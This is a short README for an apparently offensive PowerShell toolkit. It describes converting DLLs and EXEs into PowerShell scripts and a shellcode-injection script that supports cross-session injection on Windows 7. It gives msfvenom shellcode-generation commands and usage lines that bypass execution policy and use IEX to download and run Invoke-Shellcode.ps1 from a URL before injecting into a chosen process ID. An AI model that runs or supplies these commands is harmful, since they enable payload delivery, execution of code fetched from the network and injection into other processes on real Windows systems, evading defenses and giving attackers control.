# PowershellTools

## dll2ps.ps1 (Support DllRegisterServer)
    powershell.exe -ep bypass -f dll2ps.ps1 -File test.dll -Out out.ps1
  
## exe2ps.ps1
    powershell.exe -ep bypass -f exe2ps.ps1 -File test.exe -Param "hello world" -Out out.ps1

## inject.ps1 (Support win7 cross session injection)
    Generate shellcode
    x86：msfvenom -a x86 --platform windows -p windows/exec CMD="cmd /c c:\windows\notepad.exe" exitfunc=thread -f powershell | cut -c 9- | tr  -s '\r\n' ',' | cut -c 9- | sed 's/^/@(/g' | sed -e 's/\(.*\),/\1)/'
	x64：msfvenom -a x86_64 --platform windows -p windows/x64/exec CMD="cmd /c c:\windows\notepad.exe" exitfunc=thread -f powershell | cut -c 9- | tr  -s '\r\n' ',' | cut -c 9- | sed 's/^/@(/g' | sed -e 's/\(.*\),/\1)/'
    Usage
	powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-Shellcode.ps1'); Invoke-Shellcode -Shellcode @(...) -ProcessID pid -Verbose"
	powershell.exe -ep bypass -c "&{. C:\Invoke-Shellcode.ps1; Invoke-Shellcode -Shellcode @(...) -ProcessID pid -Verbose}"
